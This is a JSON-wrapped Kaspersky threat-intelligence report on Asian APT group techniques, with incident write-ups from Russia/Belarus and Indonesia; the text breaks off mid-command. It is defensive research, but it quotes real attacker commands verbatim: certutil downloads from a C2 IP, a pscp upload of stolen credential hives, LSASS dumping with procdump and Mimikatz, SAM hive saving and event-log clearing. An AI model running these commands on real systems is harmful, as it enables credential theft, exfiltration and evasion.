{
    "id": "d4ec9c54-3526-49ff-b6f0-1aae43005062",
    "created_at": "2023-12-19T02:04:55.063522Z",
    "updated_at": "2025-03-27T02:17:00.577432Z",
    "deleted_at": null,
    "sha1_hash": "ab3211cc642317a62c5330b640f24f08c3efb090",
    "title": "Modern Asia APT groups TTPs",
    "authors": "Kaspersky",
    "file_creation_date": "2023-11-09T17:36:37Z",
    "file_modification_date": "2023-11-09T12:42:55Z",
    "file_size": 13114846,
    "plain_text": "Kaspersky Threat Intelligence\n\n# Modern\n Asian APT Groups\n\n###### Tactics, Techniques and Procedures\n\n\n-----\n\n##### Contents\n\nIntroduction Technical details\n##### 3 73\n\nAnalysis of attacker actions based\n\nIntended audience of this report\n##### 4 on the Unified Kill Chain 289\n\nAuthors and acknowledgments Mitigation\n##### 5 302\n\nStructure of the report Statistics on attacked companies\n##### 6 307\n\nIncidents involving Asian APT\ngroups in various regions of the Conclusions\n##### 7 313\nplanet\n\nIncident 1. Russia and Belarus 10\n\nIncident 2. Indonesia 23 Appendix I — Sigma Rules\n\n##### 314\n\nIncident 3. Pakistan 36\n\nIncident 4. Malaysia 50\n\nIncident 5. Argentina 60\n\nSummary of the examined\n72 Contents\nincidents 368\n\n\n-----\n\n##### Introduction\n\nKaspersky is constantly tracking thousands of malicious actors all over the world, including highly advanced\ngroups that are capable of conducting sophisticated cyberattacks. These formidable groups are globally\nrecognized as Advanced Persistent Threats (APT).\n\nAt Kaspersky Cyber Threat Intelligence, we analyze and study data from various attacks throughout the\nworld. Using this data, we extract a large amount of useful information, including the tactics, techniques, and\nprocedures (TTPs) of attackers. Based on this information, we distinguish patterns in the attackers’ behavior.\n\nIn this report, we share the most valuable intelligence that we gathered on Asian APT groups. Why them?\nOver the course of our work, we noticed that these groups attacked the greatest number of countries and\nindustries. Most importantly, our analysis of hundreds of attacks revealed a similar pattern among various\ngroups. They achieve specific objectives at various stages of the Cyber Kill Chain using a common but limited\nnumber of techniques encountered by security professionals all over the world. Unfortunately, security teams\noften have difficulty detecting these attacks in their own infrastructure.\n\n###### Our team has a tradition of including an inspiring quote in each of our reports. For this report, we chose a quote from the \"Ender's Game” movie:\n\nIt perfectly reflects the principle that we adhere\nto in the Cyber Threat Intelligence team. It was\nprecisely this principle that inspired us to write and\npublish this report.\n\nIt is not our goal to attribute a particular group to\n\n##### \"There is no\n\na specific country in Asia. Our goal is to provide\nthe most extensive information on the approaches\n\n##### teacher but the\n\ntaken by APT actors, their TTPs, and the ways\nto mitigate these attacks. For this purpose, we\n\n##### enemy\"\n\nwill share our specially crafted SIGMA rules that\nwill help you detect a potential attack in your\ninfrastructure.\n\n\n##### \"There is no teacher but the enemy\"\n\n\n-----\n\n##### Intended audience of this report\n\nAs mentioned above, we observe a large number of worldwide attacks involving the groups and threats\ndescribed in this report. Most organizations are often unprepared to meet these threats and therefore\nencounter difficulties detecting an attacker within their network.\n\nWe created this report to provide the cybersecurity community with the most well-prepared intelligence data\nto effectively counteract these threats. This report will be most useful to the following:\n\n###### SOC analysts Cyber Threat Intelligence analysts\n\n\n###### Digital Forensics (DFIR) experts\n\n\n###### Threat Hunting experts Cybersecurity experts\n\n\n###### C-Level executives responsible for cybersecurity in their company\n\n\n###### Domain administrators\n\n\nThis material can serve as a library of knowledge on the main approaches used by Asian APT groups\nwhen they hack an infrastructure. The report also contains detailed information on the attackers’\ntactics, techniques, and procedures (TTPs) based on the MITRE ATT&CK methodology.\n\n\n-----\n\n|Col1|Data on APT threats|Col3|Col4|Col5|\n|---|---|---|---|---|\n||||||\n\n\n##### Authors and acknowledgments\n\nThis report was prepared by our Kaspersky Cyber Threat Intelligence team that gathers and analyzes data\non APT threats and financially motivated attacks. This data comes from various sources, including our own\nresearch and the work of other Kaspersky departments, such as:\n\n###### Kaspersky Cyber Threat Intelligence team\n\nData on APT threats\n\n###### Threat Research SOC GReAT GERT ICS CERT\n\nThreat Research Team Kaspersky Security Global Research and Global Emergency Kaspersky ICS CERT\n\nOperations Center Analysis Teams Response Team\n\nOur Kaspersky Cyber Threat Intelligence team relies on state-of-the-art tools, practices, and approaches, such\nas MITRE ATT&CK, F3EAD, Pyramid of Pain by David Bianco, Intelligence Driven Incident Response, and Unified\nCyber Kill Chain, to study threat actors’ TTPs and network behavior, and to help incorporate many different\ndepartments into CTI processes.\n\n###### Team of authors: Nikita Nazarov Kirill Mitrofanov\n\nHead of Threat Exploration Cyber Threat Intelligence Team Lead\n\n###### Alexander Kirichenko Vladislav Burtsev\n\nSenior Cyber Threat Intelligence Analyst Senior Cyber Threat Intelligence Analyst\n\n###### Natalya Shornikova\n\nLead Cyber Threat Intelligence Analyst\n\nWe are also especially thankful Sergey Kireev Danila Nasonov\nto the following colleagues for\ntheir help in writing this report: Cyber Threat Intelligence Analyst ex. Junior Cyber Threat Intelligence\n\nAnalyst\n\n###### Vasily Berdnikov\n\nLead Malware Analyst\n\n\n-----\n\n##### Structure of the report\n\nThis report consists of 6 main sections in which each reader can easily find the information they are\ninterested in.\n\n###### 1 Incidents involving Asian APT groups in various regions of the\n planet\n\nThis section contains information on five unique incidents that we detected in different parts of\nthe world. Each incident is a unique case within the specific country and industry, and we provide a\ndescription of the actions and TTPs of the perpetrators. At the end of each section, we put together a\nconsolidated table showing the TTPs of the APT groups that we encountered in these incidents. This\ntable consists of a list of TTPs and their overlapping use in these incidents.\n\n###### 2 Technical details\n\nThe \"Technical details\" section contains a detailed description of the individual techniques that we\ndetected in the attacks conducted by Asian APT groups. Each technique contains the following:\n\n\n###### Main  description\n\nTechnical details on how\nthe specific technique\nworks\n\n\n###### Examples of procedures\n\nExample implementations\nof this technique that we\ndetected in attacks by\nAsian APT groups\n\n\n###### Detection\n\nData on the approaches\nemployed to detect the\ndescribed technique, and\nthe EventIDs of events in\nvarious monitoring agents\nused to detect the specific\nthreat.\n\n\n###### SIGMA rules\n\nList of SIGMA rules relevant\nto this technique. The\nactual SIGMA rules can\nbe found in the Appendix:\nSIGMA\n\n\n###### Analysis of attacker actions based on the Unified Kill Chain\n\nWe used the Unified Kill Chain model to create our own table linked to Asian APT groups so that we\ncould provide a top-level look into the motivations and behavioral patterns of these actors, and provide\ndata on the possible steps taken by Asian APT groups when they conduct potential attacks.\n\n###### Mitigation\n\nThis section describes the measures undertaken to mitigate risks associated with the described TTPs.\n\n###### Statistics on attack victims\n\nThis section provides consolidated statistics on the victims of Asian APT groups throughout the world\nand a breakdown by country and industry.\n\n###### Appendix: SIGMA\n\nThis appendix contains the SIGMA rules that can help to detect the techniques described in this\nreport.\n\n\n-----\n\n##### Incidents involving Asian APT groups in various regions of the planet\n\nAlmost every quarter, someone publishes major research devoted to campaigns or incidents involving Asian\nAPT groups. These campaigns and incidents are targeting various organizations from a multitude of industries.\nLikewise, the geographic locations of victims are not limited to just one region. This type of research normally\ncontains detailed information about the tools used by APT actors, the vulnerabilities that they exploit, and\nsometimes even a specific attribution. Despite the large number of these types of reports, companies often\nremain unprepared to face these kinds of attackers. With the advanced tools and techniques used by threat\nactors today, cybersecurity professionals require not only high-level expertise and extensive experience, but\nalso the infrastructure supplemented by well-organized asset management and vulnerability management\nprocesses, network segmentation, fine-tuned audits, and intelligently configured data security tools. In most\ncases, an unprepared infrastructure is the primary factor enabling Asian APT groups to conduct successful\nattacks.\n\nWhen considering the importance of preparing the infrastructure and fine-tuning the processes mentioned\nabove, do not forget about the fundamental Blue Team principle: to successfully defend against an attack,\nyou must understand how it is conducted. To counteract targeted attacks, you must understand the tactics,\ntechniques, and procedures of threat actors.\n\nFor this purpose, in this section we gathered information about incidents occurring at different times in\ndifferent countries over the course of 2022 and involving various Asian APT groups\n\nFigure 1 Geographic location of victims mentioned in the Incidents section\n\n2 1\n\n1. Russia\n\n2. Belarus\n\n4\n\n3. Indonesia\n\n4. Pakistan\n\n5. Malaysia 5\n\n3\n\n6. Argentina\n\n\n-----\n\nThe samples observed in the described incidents were also observed by us in other countries, including\nCanada, Vietnam, South Africa, and Japan (Figure 2). For each incident, we described various stages of the\nattack and highlighted the threat actor's TTPs. A more detailed description of the APT actors techniques is\nprovided in the Technical details section.\n\nFigure 2 Geographic location of samples mentioned in the Incidents section\n\n1\n\n1. Canada 4\n\n2. Vietnam\n\n3. South Africa 2\n\n4. Japan\n\n3\n\nEach case study in this section covers a unique investigation. In some cases, we were able to study an attack\nin its entirety, starting from the Initial Access stage and finishing with the Impact stage. In other cases, our\ninvestigation began at the later stages of the Cyber Kill Chain. Out of the many incidents that we examined, we\nselected those that revealed the most about the behavioral patterns of Asian APT groups.\n\n\n-----\n\nFigure 3 Geographic location of C&C servers in investigated incidents\n\nConcentration\nof C&C servers:\n\nMost\n\nLeast\n\nThe detailed description of a particular incident includes an in-depth history of the attack progression. We\nincluded the actual command-line arguments, registry keys, and the paths and names of the files and utilities\nemployed by the actors behind the attack. We altered only the sensitive information.\n\n\n-----\n\n###### Incidents involving Asian APT groups in various regions of the planet\n\n### Incident 1.  Russia and Belarus\n\n\n-----\n\n##### Incident 1. Russia and Belarus\n\n###### Victim summary\n\n\nIndustry\n\n###### Government\n\n Incident description\n\n\nCountries affected\n\n###### Russia, Belarus\n\n\nThreat\n\n###### WebDav-O\n\n\nIn 2022, our systems detected an attack employing malware known as WebDav-O that targeted a government\nagency in Russia. Several researchers had previously described a series of attacks using WebDav-O and\nMail-O. We were able to track the activity of the WebDav-O implant in our telemetry at least until 2018. This\nactivity was aimed at government-linked targets located in Belarus. Based on our research, we were able to\nfind additional variants of the malware and observe commands executed by the attackers on compromised\nhosts.\n\n###### Detailed description\n\n**Exploit Public-Facing Application T1190 (Initial access)**\n\nTo get initial access to the victim, the attacking group exploited a vulnerability in IIS Windows Server. We\nobserved the following activity in Windows logs: The IIS Worker process w3wp.exe ran the malicious files of the\nattackers.\n\nAfter successful infection, a malicious library was uploaded into one of the following directories:\n\n\nС:\\Windows\\System32\\logfiles\nС:\\Windows\\System32\\\n\n\nAs part of the malware deployment process, APT actors usually create a Windows service Create or Modify\n**System Process: Windows Service T1543.003. A rather unusual operation in this incident was when the**\nattacker changed a registry key so that the malicious DLL was run with the command line \"svchost.exe -k\nnetsvcs\", which looks legitimate:\n\n\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v\nnetsvcs /t REG_MULTI_SZ /d AeLookupSvc\\0 ... \\0SQLReader\n\n\n-----\n\nAfter adding an additional value for the HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\\nnetsvcs registry key, the attacker created a new Windows service named SQLReader with the executable file\n\"svchost.exe -k netsvcs\".\n\nsc create SQLReader binpath= \"С:\\Windows\\System32\\svchost.exe -k netsvcs\" start= auto\ndisplayname= \"SQL Server VSS Reader\"\n\nThey then added a description of the service, the path to the malicious DLL to the corresponding registry key\nfor SQLReader, and started the service using sc.exe:\n\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SQLReader /v Description /t\nREG_SZ /d \"SQL Server VSS Reader\"\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SQLReader\\Parameters /v\nServiceDll /t REG_EXPAND_SZ /d \"С:\\Windows\\System32\\sqlrder.dll\"\nsc start SQLReader\n\nsqlrder.dll (MD5: 69B99401A0BBBF7BEC1B27DCE12C8B3A) is one of the WebDav-O implants that\ncommunicates with Yandex Disk, just like other implant variants communicate with DropBox and Mail.ru C2.\nAttackers use these implants to receive commands and to export their results. This is an example of the\ntechnique known as Web Service: Bidirectional Communication T1102.002.\n\nDuring our investigation, we used the Kaspersky Threat Intelligence Portal to check the URL that was\ncontacted by the process and found additional malicious executables that communicated with this URL.\n\n\n-----\n\nFigure 4 List of malware communicating with the malicious URL\n\nWhen searching for objects associated with sqlrder.dll in Kaspersky TIP, the Research Graph tool showed a link\nwith the APT group known as CoughingDown.\n\nOne malware used by CoughingDown is a network sniffer and loading module (MD5:\nB00EA7F6025D1FC709A4F2B02A9EF3A0) that has common characteristics with the Mail-O variant. Both\nuse a cloud platform for data exfiltration by simultaneously sending the data during predetermined working\nhours (from 9:00 to 17:00 for the CoughingDown variant, and from 9:00 to 16:00 for Mail-O). Additionally, the\nfilename format of the heartbeat file created by Mail-O (<random_integer>_[MMDDhhmmss].dat) is similar\nto the format of a file created by CoughingDown and uploaded to Yandex Disk: STATE_HEX-HOSTNAME_\nHHMMSSmmm.dat.\n\n\n-----\n\nFigure 5 Threat Intelligence Portal connections graph\n\nThe WebDav-O variant observed in this incident uses the Yandex Disk cloud service to host files with\ncommands for the implant. After gaining access to a given storage account using hard-coded credentials,\nthe malware can negotiate an encryption session key and subsequently read and process command files\nencrypted with this key. The contents of these files then allow the operators to upload and download files\nfrom the target file system, and to use the file system to execute arbitrary commands from the command shell\n(cmd.exe) on it.\n\nFiles containing commands are received from Yandex Disk as follows.\n\nAfter authentication of 'GET webdav.yandex.ru/?userinfo' and generation of a session key, the malware checks\nthe network connection using GET webdav.yandex.ru/test3.txt, then executes the specialized Webdav method\nPROPFIND webdav.yandex/test, which receives an XML file in response. This XML file contains multiple paths\nto data resources, and each set of data is extracted using a GET request and decrypted using the session key\nmentioned above. The decrypted data of each request represents a command that should be executed by\nmalware. After execution, the resource will be deleted from Yandex Disk via an HTTP DELETE request in which\nthe resource path is specified as an argument.\n\n\n-----\n\n###### Here are the commands that we tracked.\n\nFirst the attacker executed a series of ping commands:\n\ncmd.exe /c C: & cd\\ & cd \"\" & ping <host> -n 1\n\nThen viewed the connected network drives:\n\ncmd.exe /c C: & cd\\ & cd \"\" & net use\n\nThen the operator attempted to connect to remote hosts via SMB using a compromised account:\n\ncmd.exe /c C: & cd\\ & cd \"\" & net use \\\\<ip> /u:<domain>\\<username> <password>\n\nThe operator also conducted reconnaissance on remote hosts by using the wmic.exe:\n\ncmd.exe /c C: & cd\\ & cd \"\" & wmic /node:<ip> /user:<domain>\\<username> /password:<password>\nprocess call create \"<command>\"\n\n\n-----\n\n###### All discovery commands that were executed by the attackers on local and remote systems are listed in the table below.\n\n MITRE ATT&CK  Commands matrix technique\n\nhostname\nSystem Network Configuration Discovery systeminfo\ncmd /c echo list volume |diskpart\n\nroute print\nSystem Network Configuration Discovery tracert -h 2 <private_ip>\nipconfig /displaydns\n\nqwinsta\nSystem Network Connections Discovery\nnetstat -ano\n\nSystem Time Discovery time /t\n\n\nQuery Registry\n\nProcess Discovery\n\n\nreg query\nhku\\<domain_user_sid>\\Software\\Microsoft\\Office\\14.0\\\nOutlook /s | find \"<victim domain name>\"\ncmd /c tasklist\nwmic process | find \"<process_name>\"\n\nping -n 1 administrators\nping -n 1 admin-pc\nping -n 1 dc01\nping <host>\nC:\\Windows\\System32\\logfiles\\portscan.exe -h [REDACTED] -p\n22 C:\\Windows\\System32\\logfiles\\portscan.exe -h [REDACTED]\n-p 25,110\ncmd.exe /c C: & cd\\ & cd \"Windows\\web\" & C:\\Windows\\\nSystem32\\logfiles\\nbtscan.exe [REDACTED]\n\n\ncmd /c wmic product get name\nRemote System Discovery\ndir \\\\<ip>\\c$\\windows\\system32\\tasks\n\nSoftware Discovery net use\n\ncmd.exe /C net group \"domain admins\" /domain\"\nNetwork Share Discovery\ncmd.exe /C net group /do\n\n\n-----\n\n###### MITRE ATT&CK  Commands matrix technique\n\ndir\nFile and Directory Discovery dir \\\\<ip>\\c$\\\"program files\" /od\ndir \\\\<ip>\\c$\\\"program files (x86)\" /od\n\nPermission Groups Discovery net group \"domain computers\" /do\n\nnltest /dclists\nDomain Trust Discovery nltest /domain_trusts\nnltest /dclist:<domain>\n\nThe output results of the discovery were saved to %temp%\\temp.txt. The attacker read these results and then\ndeleted them:\n\n\ncmd.exe /c C: & cd\\ & cd \"\" & type \\\\<ip>\\c$\\windows\\temp\\temp.txt\ncmd.exe /c C: & cd\\ & cd \"\" & del \\\\<ip>\\c$\\windows\\temp\\temp.txt\n\n\nExtraction of test.rar:\n\n\ncmd /c $temp\\rar e test.rar -p<password> >$temp\\temp.txt\n\n\nRunning malware on a remote system — Masquerading: Masquerade Task or Service T1036.004:\n\n\ncmd.exe /c C: & cd\\ & cd \"\" & dir \\\\<ip>\\c$\\windows\\system32\\conhost64.exe\ncmd.exe /c C: & cd\\ & cd \"\" & wmic /node:<ip> /user:<domain>\\<username> /password:<password>\nprocess call create \"cmd /c $system32\\conhost64.exe\"\n\n\n-----\n\nAfter the Discovery process, the attackers attempted to gather data from the current host and from remotely\nconnected hosts — Data from Local System T1005.\n\ncmd.exe /c C: & cd\\ & cd \"windows\\temp\" & dir rar*\ncmd.exe /c C: & cd\\ & cd \"windows\\temp\" & dir \"$programfiles\\winrar\\rar.exe\"\n\nArchiving on remote systems:\n\nrar a -r 123.rar \\\\<ip>\\c$\\users\\<username>\\desktop\\* -hp<password> -ta20220302\n\\\\<ip>\\c$\\program files\\winrar\\rar.exe\" a -r -m5 -hp<password> \\\\<ip>\\c$\\windows\\temp\\sduid.sys\n\\\\<ip>\\c$\\users\\<username>\\desktop\\<redacted>\\*\n\nAnother important stage of the attack is obtaining user credentials. User credentials allow attackers to elevate\ntheir privileges and move laterally through the network. In this incident, we observed activity of the procdump.\nexe tool, which can be used to create a memory dump of the lsass.exe process — OS Credential Dumping:\n**LSASS Memory T1003.001.**\n\nprocdump.exe -accepteula -ma lsass.exe С:\\Windows\\Temp\\mem.dmp\n\nWe also observed the msdol.exe process with arguments that are typical of Mimikatz:\n\nС:\\Windows\\System32\\logfiles\\msdol.exe privilege::debug sekurlsa::logonpasswords exit\n\n\n-----\n\nTo obtain user credentials from remote hosts, the attackers used the following techniques:\n\n**• OS Credential Dumping: Security Account Manager T1003.002**\n\n**• OS Credential Dumping: LSA Secrets T1003.004**\n\n**• OS Credential Dumping: Cached Domain Credentials T1003.005**\n\nUsing the wmic and reg save commands, they saved the registry hives containing account credentials (SAM,\nSECURITY, and SYSTEM) to the Windows temp folder:\n\n\nwmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create \"cmd.exe /c\nreg save HKLM\\sam С:\\Windows\\Temp\\sam.save\"\nwmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create \"cmd.exe /c\nreg save HKLM\\security С:\\Windows\\Temp\\security.save\"\nwmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create \"cmd.exe /c\nreg save HKLM\\system С:\\Windows\\Temp\\system.save\"\n\n\nIn addition to wmic.exe, the attackers also used PsExec to move through the network:\n\n\npsexec.exe \\\\[REDACTED]\\ cmd /c \"systeminfo > С:\\Windows\\help\\123.txt\"\npsexec.exe \\\\[REDACTED]\\ cmd /c \"ping dropbox.com -n 1 > С:\\Windows\\help\\123.txt\"\npsexec.exe \\\\[REDACTED]\\ cmd /c \"ping mail.ru -n 1 > С:\\Windows\\help\\123.txt\"\npsexec.exe -s \\\\[REDACTED] cmd /c \"PowerShell -psconsolefile \"C:\\Program Files\\Microsoft\\Exchange\nServer\\v15\\bin\\exshell.psc1\" Get-MailBox > С:\\Windows\\Temp\\1.txt\n\n\nAfter saving the files containing credentials, the attackers added them to an archive and then sent them to the\nC2 server — Exfiltration Over C2 Channel T1041:\n\n\nrar.exe a 162.rar -r \"\\\\[REDACTED]\\С:\\Windows\\Temp\\*.save\" -p<password>\npscp.exe -P 8443 -pw [REDACTED] С:\\Windows\\System32\\logfiles\\162.rar root@5.183.103[.]181:/\nroot/162.rar\nС:\\Windows\\System32\\logfiles\\rar.exe a С:\\Windows\\Temp\\vpp.rar С:\\Windows\\Temp\\*.kdbx hp<password>\n\n\n-----\n\nThe attackers used a customized tool called HTran[1]. HTran is an open source tool for port forwarding that is\navailable on GitHub. The HTran tool used in this attack appears to be an adapted version of the tool found on\nGitHub because it has an additional parameter for the \"-tran\" option: The standard \"-tran\" option supports 3\nparameters, while a fourth \"LocalIpAddress\" parameter is available in this example. This parameter allows you\nto specify the local IP address binding for port forwarding. By default, HTran binds to all interfaces (INADDR_\nANY). In this configurable version, the attacker can specify which interface the proxy is bound to.\n\nWhile analyzing logs during the incident investigation, we observed use of the COM Hijacking technique (Event\nTriggered Execution: Component Object Model Hijacking T1546.015). This technique lets attackers execute\narbitrary code in the address space of a trusted process. For COM Hijacking, attackers use the following\nregistry keys depending on the particular deployment scenario: InprocServer(32), LocalServer(32), TreatAs, or\nProgID in the HKCU\\Software\\Classes\\CLSID\\<com_object_id> registry hives.\n\nIn this incident, the attackers ran a malicious executable that had already been downloaded to the system\n(MD5: 0024EE86702EE9234771731975E9EE47):\n\n\ncmd.exe С:\\Windows\\system32\\i.exe С:\\Windows\\system32\\2.bin\n\n\nThe process ran the file $appdata\\brmsl.exe.mui (2.bin - MD5: 123FD2B1D1C1A03227B0E75572082436), using\nrundll32.exe:\n\n\ncmd.exe /c rundll32.exe $appdata\\brmsl.exe.mui StartNow\n\n\nIt also set this file as the registry key value for the COM object Shell Rebar BandSite, which corresponds to the\nDLL file С:\\Windows\\system32\\explorerframe.dll:\n\n\nRegistry Key: $hkcu\\software\\classes\\clsid\\{ecd4fc4d-521c-11d0-b792-00a0c90312e1}\\inprocserver32\nRegistry Value: $appdata\\brmsl.exe.mui\nThe COM Object that was abused: Shell Rebar BandSite\nThe legitimate DLL that was hijacked: С:\\Windows\\system32\\explorerframe.dll\n\n\n1\n\n\nHTran\n\n\n[Learn more](https://github.com/HiwinCN/HTran)\n\n\n-----\n\nThroughout the entire operation, the attackers periodically deleted system logs by using wevtutil — Indicator\n**Removal: Clear Windows Event Logs T1070.001:**\n\nwevtutil cl system\nwevtutil cl security\nwevtutil cl application\n\n###### Summary\n\nThe described activity was part of a prolonged campaign aimed at one of Russia's government agencies.\nAccording to our telemetry, this malware was also used against entities located in Belarus and primarily\ntargeted its government agencies. This activity has some links to the group known as CoughingDown. The\ngroup responsible for this operation displays a high level of motivation. Their main goal is to persistently reside\nin the infrastructure and conduct espionage.\n\nDownload techniques in JSON format for MITRE Navigator:\n\n[Learn more](https://box.kaspersky.com/f/24216a93f1f74a038c49/?dl=1)\n\n\n-----\n\nFigure 6 Threat Landscape page interface in TIP\n\n\n-----\n\n###### Incidents involving Asian APT groups in various regions of the planet\n\n### Incident 2.  Indonesia\n\n\n-----\n\n##### Incident 2. Indonesia\n\n###### Victim summary\n\nIndustry Countries affected Threat\n\n###### Government Indonesia GhostEmperor\n\n Incident description\n\nIn August of 2022, our analysts detected an attack against a government-run Indonesian company. The APT\ngroup known as GhostEmperor is suspected of being behind the attack.\n\nGhostEmperor is an APT group that has been tracked since 2021. It is engaged in cyberespionage in various\nsectors, including government and financial organizations, energy and technology companies.\n\nThis APT group uses various attack methods, including phishing campaigns, software vulnerability exploits, and\nnetwork traffic interception. This threat actor uses various tools and techniques to remain unnoticed, including\nfake domain names, encrypted communication channels, and multi-staged propagation of malicious programs.\n\n###### 1\n\n Victims.\n\nGhostEmperor mainly targets government and corporate networks in Southeast Asia. However, their attacks may also extend to other\nregions.\n\n###### 2\n\n Attack methods.\n\nThis group uses various attack methods, including spear-phishing, malicious email attachments, and network vulnerability exploits. They\nalso use remote access tools (RAT) and custom-developed malware to gain access to the victim's systems and control them.\n\n###### 3\n\n Goals.\n\nGhostEmperor usually aims to steal data or conduct espionage.\n\n\n-----\n\nIn this particular incident, we do not have access to any information on the initial vector of infection of the\ncompany. The detected events let us identify the actions of the threat actor on infected servers of the\ncompany starting from the middle of the Cyber Kill Chain. As usual with most Asian APT groups, the attackers\nmaintain persistence in the system by using the technique known as Hijack Execution Flow: DLL Side**Loading T1574.002.**\n\n###### Detailed description\n\n**Ingress Tool Transfer T1105:**\n\nThe first step of the attacker on the victim's system is to download legitimate software named meupdate.exe\n(MD5: 0114B3BF0B53DEB5B9C300B2295DD71F) with a legitimate signature from Microsoft Corporation at the\nnon-standard path \"c:\\windows\\help\\help\\meupdate.exe\".\n\nThis software is delivered through the LOLBin utility named certutil.exe:\n\n\ncmd.exe /c certutil -urlcache -split -f http://8.210.141[.]104:8099/MEUpdate.exe\nС:\\Windows\\Help\\Help\\MEUpdate.exe\"\n\n\nAccording to the Microsoft description, this software is an update component that is built into the Windows\nEdge browser. Standard name and path of the program: “C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\\nMicrosoftEdgeUpdate.exe\"\n\nFigure 7 Trusted digital signature\n\n\n-----\n\n**Hijack Execution Flow: DLL Side-Loading T1574.002:**\n\nA malicious library is also dropped into this directory—msedgeupdate.dll (MD5:\n6D72C024B804CF690C7E7E8A7135EDB0). After the process is started, the malicious library is loaded into its\naddress space and establishes network connections with the following IP addresses:\n\n   - 47.96.167[.]205\n\n    - 8.210.141[.]104\n\n   - 23.224.91[.]98\n\nFigure 8 Network connection information\n\n**Establishing a TCP session with the C2 of the attackers**\n\nThe specified addresses are the attackers' command and control centers (C2) used to manage the malicious\nsoftware. A large amount of malicious samples were downloaded from these IP addresses.\n\nInformation from Kaspersky Threat Intelligence Portal.\n\n\n-----\n\nFigure 9 Information about malware that contacted a malicious IP\n\n**Process Injection: Process Hollowing T1055.012 + Masquerading T1036:**\n\nThen the malicious DLL, which is executed in the address space of the legitimate process, performs the\n**Process Injection technique: Process Hollowing T1055.012. The main mechanism of this technique is to**\ncreate a process in the suspended state. This allows the attacker to inject malicious code into this process by\nreplacing the executable file image in the address space. A detailed description of this technique is provided in\nthe Technical details section. While employing the Process Hollowing technique, an attacker is often disguised\nas a legitimate process (Masquerading T1036).\n\nIn the described incident, the threat actor implemented Process Hollowing by creating the svchost.exe\nprocess. After the image was replaced and the malicious code was run in the context of svchost.exe, the main\nmalicious activity began. This activity involved reconnaissance and information collection for its subsequent\nexfiltration.\n\n**Create or Modify System Process: Windows Service T1543.003:**\n\nThe infected svchost.exe generates the child process cmd.exe, which registers and starts the service to\nelevate privileges from administrator to system privileges:\n\n\nsc.exe create \"server power\" binpath= \"С:\\Windows\\system32\\cmd.exe /c start\nС:\\Windows\\Help\\help\\MEUpdate.exe\"\nsc.exe start \"server power\"\n\n\n-----\n\nA similar process chain is observed when the attacker conducts reconnaissance of the environment:\n**svchost. exe › cmd.exe › process for reconnaissance. The threat actor uses a standard set of commands**\nthat allow them to collect basic information about the infected system.\n\n###### MITRE ATT&CK  Commands matrix technique\n\nquser.exe whoami\nSystem Owner/User Discovery T1033\nquser.exe quser\n\nSystem Time Discovery T1124 net.exe time /do\n\nProcess Discovery T1057 tasklist.exe /svc\n\nSystem Network Connections Discovery T1049 cmd.exe\" /c netstat -ano\"\n\nSystem Network Configuration Discovery T1016 ipconfig.exe /all\n\ncmd.exe /C systeminfo\nSystem Information Discovery T1082\ncmd.exe /C net view \\\\HOST X\n\nFile and Directory Discovery T1083 cmd.exe /c dir $appdata\"\n\n\nSoftware Discovery: Security Software Discovery\nT1518.001\n\n\ncmd.exe /C dir \"$programfiles\\Kaspersky Lab\\Kaspersky\nEndpoint Security for Windows\\version.txt\"\ncmd.exe /C type \"$programfiles\\Kaspersky Lab\\Kaspersky\nEndpoint Security for Windows\\version.txt\"\n\n\ncmd.exe /C net group \"domain admins\" /domain\"\nPermission Groups Discovery T1069\ncmd.exe /C net group /do\n\nSystem Network Configuration Discovery: Internet\nping.exe -n 1 -a 10.1.2.98\nConnection Discovery T1016.001\n\n\nGroup Policy Discovery T1615\n\n\ncmd.exe /C type \\\\<dc_hostname>\\SYSVOL\\<fqdn>\\Policies\\\n{C9289F9A-2AB9-****-****-*****}\\Machine\\Preferences\\\nScheduledTasks\\ScheduledTasks.xml\"\ncmd.exe /C type \\\\<dc_hostname>\\sysvol\\run.bat\"\n\n\n-----\n\nAfter gathering information on the environment, the attacker attempted to obtain the user credentials for\nlateral movement through the network.\n\n**OS Credential Dumping: LSASS Memory T1003.001:**\n\nTo get the NT hashes of user account passwords, the attackers dumped the lsass.exe process memory:\n\nThe choice of dumping tool is very interesting. It is part of the Microsoft Visual Studio suite and may reside on\na machine in the legitimate directory \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\Common7\\\nIDE\\Extensions\\TestPlatform\\Extensions\\DumpMinitool.exe\". For some reason, the tool is very popular on\nAsian forums when discussing how to bypass security mechanisms for dumping lsass.exe[2]:\n\nFigure 10 Valid digital signature\n\nIn the described incident, the attacker used the traditional method for implementing this tool:\n\n\n$windir\\Help\\Help\\DumpMinitool.exe --file 1.txt --processId 748 --dumpType Full\"\ncmd.exe /C DumpMinitool.exe --file 1.txt --processId 748 --dumpType Full\"\n\n\n2\n\n\naqtd wangan programmerall ctfiot tencent\n\n[Learn more](https://www.aqtd.com/nd.jsp?id=1817) [Learn more](https://www.wangan.com/p/7fy7f8f38ce37898) [Learn more](https://programmerall.com/article/63592521699/) [Learn more](https://www.ctfiot.com/35803.html) [Learn more](https://cloud.tencent.com/developer/article/2200048)\n\n\n-----\n\nAdditionally, the attacker simultaneously uses three tools with two different libraries:\n\n   - $windir\\help\\help\\ssp.exe (MD5: AF893448B4D1862C42D6E1CC3AA8878D)\n\n   - $windir\\help\\help\\duplicatedump.exe - (MF5: AD2C078AE847EDE5C66494F0DDECD35C)\n\n   - $windir\\help\\help\\new.exe - (MD5: 018F65947686B4CEA313570AC74780BD)\n\n   - $windir\\Help\\Help\\LSAPlugin.dll - (MD5: EC38F08AAAEADD833B0B356E2783FFD4)\n\n   - $windir\\Help\\Help\\Dll7.dll - (MD5: 871CC8F514011F4796982D5E6E5F35C1)\n\nThe tool was always delivered together with an archive and was run from open directories:\n\nFigure 11 Archive contents\n\n$windir\\Help\\Help\\ssp.exe $windir\\Help\\Help\\Dll7.dll\n$windir\\help\\help\\duplicatedump.exe -f test -c $windir\\Help\\Help\\LSAPlugin.dll\n$windir\\Help\\Help\\new.exe 